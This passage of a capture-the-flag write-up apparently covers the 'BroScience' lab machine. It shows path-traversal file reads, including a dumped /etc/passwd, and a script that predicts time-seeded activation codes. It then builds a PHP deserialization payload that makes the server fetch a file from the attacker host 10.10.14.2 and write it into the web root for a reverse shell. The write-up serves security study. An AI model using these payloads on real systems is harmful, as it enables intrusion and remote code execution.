      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre></td><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Sun, 29 Jan 2023 16:33:15 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.54 (Debian)</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">2235</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">image/png</span>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
</pre></td></tr></tbody></table></code></div></div>

<p>I tried using PHP filters to extract the source code of the application. The code was probably adding a folder name before the file name, so that failed.</p>

<p>I tried to directly read a PHP file without a filter.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/includes/img.php?path=..%252findex.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">broscience.htb</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=6drat5f8omo5h6l5hmjinrcdai</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">document</span>
<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">none</span>
<span class="na">Sec-Fetch-User</span><span class="p">:</span> <span class="s">?1</span>
<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It worked!</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre></td><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 31 Jan 2023 00:30:48 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.54 (Debian)</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">2182</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">image/png</span>

&lt;?php
session_start();
?&gt;

&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;BroScience : Home&lt;/title&gt;
        &lt;?php 
        include_once 'includes/header.php';
        include_once 'includes/utils.php';
        $theme = get_theme();
        ?&gt;
        &lt;link rel="stylesheet" href="styles/&lt;?=$theme?&gt;.css"&gt;
    &lt;/head&gt;
    &lt;body class="&lt;?=get_theme_class($theme)?&gt;"&gt;
        &lt;?php include_once 'includes/navbar.php'; ?&gt;
        &lt;div class="uk-container uk-margin"&gt;
            &lt;!-- TODO: Search bar --&gt;
            &lt;?php
            include_once 'includes/db_connect.php';
                    
            // Load exercises
            $res = pg_query($db_conn, 'SELECT exercises.id, username, title, image, SUBSTRING(content, 1, 100), exercises.date_created, users.id FROM exercises JOIN users ON author_id = users.id');
            if (pg_num_rows($res) &gt; 0) {
                echo '&lt;div class="uk-child-width-1-2@s uk-child-width-1-3@m" uk-grid&gt;';
                while ($row = pg_fetch_row($res)) {
                    ?&gt;
                    &lt;div&gt;
                        &lt;div class="uk-card uk-card-default &lt;?=(strcmp($theme,"light"))?"uk-card-secondary":""?&gt;"&gt;
                            &lt;div class="uk-card-media-top"&gt;
                                &lt;img src="includes/img.php?path=&lt;?=$row[3]?&gt;" width="600" height="600" alt=""&gt;
                            &lt;/div&gt;
                            &lt;div class="uk-card-body"&gt;
                                &lt;a href="exercise.php?id=&lt;?=$row[0]?&gt;" class="uk-card-title"&gt;&lt;?=$row[2]?&gt;&lt;/a&gt;
                                &lt;p&gt;&lt;?=$row[4]?&gt;... &lt;a href="exercise.php?id=&lt;?=$row[0]?&gt;"&gt;keep reading&lt;/a&gt;&lt;/p&gt;
                            &lt;/div&gt;
                            &lt;div class="uk-card-footer"&gt;
                                &lt;p class="uk-text-meta"&gt;Written by &lt;a class="uk-link-text" href="user.php?id=&lt;?=$row[6]?&gt;"&gt;&lt;?=htmlspecialchars($row[1],ENT_QUOTES,'UTF-8')?&gt;&lt;/a&gt; &lt;?=rel_time($row[5])?&gt;&lt;/p&gt;
                            &lt;/div&gt;
                        &lt;/div&gt;
                    &lt;/div&gt;
                    
                    &lt;?php
                }
                echo '&lt;/div&gt;';
            } 
            ?&gt;
        &lt;/div&gt;
    &lt;/body&gt;
&lt;/html&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>I used that vulnerability to read all the PHP files I could find.</p>

<h2 id="activation-code-generation"><span class="mr-2">Activation Code Generation</span><a href="#activation-code-generation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I extracted the code from <code class="language-plaintext highlighter-rouge">/includes/utils.php</code>. The first function was used to generate the activation code.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="k">function</span> <span class="n">generate_activation_code</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$chars</span> <span class="o">=</span> <span class="s2">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span><span class="p">;</span>
    <span class="nb">srand</span><span class="p">(</span><span class="nb">time</span><span class="p">());</span>
    <span class="nv">$activation_code</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$activation_code</span> <span class="o">=</span> <span class="nv">$activation_code</span> <span class="mf">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$activation_code</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>
<p>This code was used on user creation, and the generated code was needed to activate the new account.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="c1">// Create the account</span>
<span class="k">include_once</span> <span class="s1">'includes/utils.php'</span><span class="p">;</span>
<span class="nv">$activation_code</span> <span class="o">=</span> <span class="nf">generate_activation_code</span><span class="p">();</span>
<span class="nv">$res</span> <span class="o">=</span> <span class="nb">pg_prepare</span><span class="p">(</span><span class="nv">$db_conn</span><span class="p">,</span> <span class="s2">"check_code_unique_query"</span><span class="p">,</span> <span class="s1">'SELECT id FROM users WHERE activation_code = $1'</span><span class="p">);</span>
<span class="nv">$res</span> <span class="o">=</span> <span class="nb">pg_execute</span><span class="p">(</span><span class="nv">$db_conn</span><span class="p">,</span> <span class="s2">"check_code_unique_query"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$activation_code</span><span class="p">));</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">pg_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">pg_prepare</span><span class="p">(</span><span class="nv">$db_conn</span><span class="p">,</span> <span class="s2">"create_user_query"</span><span class="p">,</span> <span class="s1">'INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)'</span><span class="p">);</span>
    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">pg_execute</span><span class="p">(</span><span class="nv">$db_conn</span><span class="p">,</span> <span class="s2">"create_user_query"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">],</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$db_salt</span> <span class="mf">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]),</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'email'</span><span class="p">],</span> <span class="nv">$activation_code</span><span class="p">));</span>

    <span class="c1">// TODO: Send the activation link to email</span>
    <span class="nv">$activation_link</span> <span class="o">=</span> <span class="s2">"https://broscience.htb/activate.php?code=</span><span class="si">{</span><span class="nv">$activation_code</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>

    <span class="nv">$alert</span> <span class="o">=</span> <span class="s2">"Account created. Please check your email for the activation link."</span><span class="p">;</span>
    <span class="nv">$alert_type</span> <span class="o">=</span> <span class="s2">"success"</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$alert</span> <span class="o">=</span> <span class="s2">"Failed to generate a valid activation code, please try again."</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The code was using the current time to seed the random generation. I was about to write a script that would generate and try every possible code for the last minute until it found one that worked. But I went back to the server response to user creation and saw that it was returning the server time.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 31 Jan 2023 00:40:12 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.54 (Debian)</span>
<span class="s">...</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I used that time to generate a token and activate my account.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nv">$chars</span> <span class="o">=</span> <span class="s2">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span><span class="p">;</span>
<span class="nv">$time</span> <span class="o">=</span> <span class="nb">strtotime</span><span class="p">(</span><span class="s1">'Tue, 31 Jan 2023 00:40:12 GMT'</span><span class="p">);</span>
<span class="nb">srand</span><span class="p">(</span><span class="nv">$time</span><span class="p">);</span>
<span class="nv">$activation_code</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
<span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$activation_code</span> <span class="o">=</span> <span class="nv">$activation_code</span> <span class="mf">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="s1">'https://broscience.htb/activate.php?code='</span> <span class="mf">.</span> <span class="nv">$activation_code</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I ran the script and used the generated link</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>php generateCode.php
https://broscience.htb/activate.php?code<span class="o">=</span>OqxSuRjhkh02FEDHXHtPeTLu5PJ8z2fo
</pre></td></tr></tbody></table></code></div></div>

<p><img data-src="/assets/images/BroScience/AccountActivated.png" alt="Account Activated" title="Account Activated" data-proofer-ignore></p>

<h2 id="remote-code-execution"><span class="mr-2">Remote Code Execution</span><a href="#remote-code-execution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I logged into the site with my activated user. I looked around, I could modify my account and add comments under exercises. I tried sending XSS and SSTI payloads, but it did not work.</p>

<p>I kept looking at the source code. The file <code class="language-plaintext highlighter-rouge">db_connect.php</code> contained database credentials.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nv">$db_host</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
<span class="nv">$db_port</span> <span class="o">=</span> <span class="s2">"5432"</span><span class="p">;</span>
<span class="nv">$db_name</span> <span class="o">=</span> <span class="s2">"broscience"</span><span class="p">;</span>
<span class="nv">$db_user</span> <span class="o">=</span> <span class="s2">"dbuser"</span><span class="p">;</span>
<span class="nv">$db_pass</span> <span class="o">=</span> <span class="s2">"REDACTED"</span><span class="p">;</span>
<span class="nv">$db_salt</span> <span class="o">=</span> <span class="s2">"NaCl"</span><span class="p">;</span>

<span class="nv">$db_conn</span> <span class="o">=</span> <span class="nb">pg_connect</span><span class="p">(</span><span class="s2">"host=</span><span class="si">{</span><span class="nv">$db_host</span><span class="si">}</span><span class="s2"> port=</span><span class="si">{</span><span class="nv">$db_port</span><span class="si">}</span><span class="s2"> dbname=</span><span class="si">{</span><span class="nv">$db_name</span><span class="si">}</span><span class="s2"> user=</span><span class="si">{</span><span class="nv">$db_user</span><span class="si">}</span><span class="s2"> password=</span><span class="si">{</span><span class="nv">$db_pass</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$db_conn</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">"&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database"</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I tried the found password to SSH as bill, but it was rejected.</p>

<p>I looked further in the utils code and saw this code.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="k">function</span> <span class="n">get_theme</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'user-prefs'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$up_cookie</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">UserPrefs</span><span class="p">()));</span>
            <span class="nb">setcookie</span><span class="p">(</span><span class="s1">'user-prefs'</span><span class="p">,</span> <span class="nv">$up_cookie</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$up_cookie</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'user-prefs'</span><span class="p">];</span>
        <span class="p">}</span>
        <span class="nv">$up</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$up_cookie</span><span class="p">));</span>
        <span class="k">return</span> <span class="nv">$up</span><span class="o">-&gt;</span><span class="n">theme</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s2">"light"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This code used PHP serialization to store and read information in the cookies.</p>

<p>The UserPrefs class did not have much I could use to attack the server.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">UserPrefs</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$theme</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$theme</span> <span class="o">=</span> <span class="s2">"light"</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">theme</span> <span class="o">=</span> <span class="nv">$theme</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I could serialize a UserPrefs object on my machine. I would control the theme properties, but reading the code, this did not give me much.</p>

<p>But I did not need to serialize a UserPrefs object. The code would unserialize anything I gave it. Reading further, I saw two interesting classes.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">Avatar</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$imgPath</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$imgPath</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span> <span class="o">=</span> <span class="nv">$imgPath</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">save</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$f</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">));</span>
        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">AvatarInterface</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$tmp</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$imgPath</span><span class="p">;</span> 

    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Avatar</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span><span class="p">);</span>
        <span class="nv">$a</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">tmp</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">__wakeup</code> method is called when an object is unserialized. On waking up, the unserialize <code class="language-plaintext highlighter-rouge">AvatarInterface</code> object would create an <code class="language-plaintext highlighter-rouge">Avatar</code> object and call <code class="language-plaintext highlighter-rouge">save</code> on it. I could control the <code class="language-plaintext highlighter-rouge">$tmp</code> and <code class="language-plaintext highlighter-rouge">$imgPath</code> properties. So I could use that to read a file and save it where I wanted.</p>

<p>I created a PHP script to generate the serialized code I needed.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">Avatar</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$imgPath</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$imgPath</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span> <span class="o">=</span> <span class="nv">$imgPath</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">save</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$f</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">));</span>
        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">AvatarInterface</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$tmp</span> <span class="o">=</span> <span class="s1">'http://10.10.14.2/rce'</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$imgPath</span> <span class="o">=</span> <span class="s1">'/var/www/html/test.php'</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Avatar</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span><span class="p">);</span>
        <span class="nv">$a</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">tmp</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">AvatarInterface</span><span class="p">())))</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This created a serialized <code class="language-plaintext highlighter-rouge">AvatarInterface</code> that would read a file from my machine, and save its contents to <code class="language-plaintext highlighter-rouge">/var/www/html/test.php</code> on the server.</p>

<p>I created the file to launch a reverse shell and started a web server on my machine.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

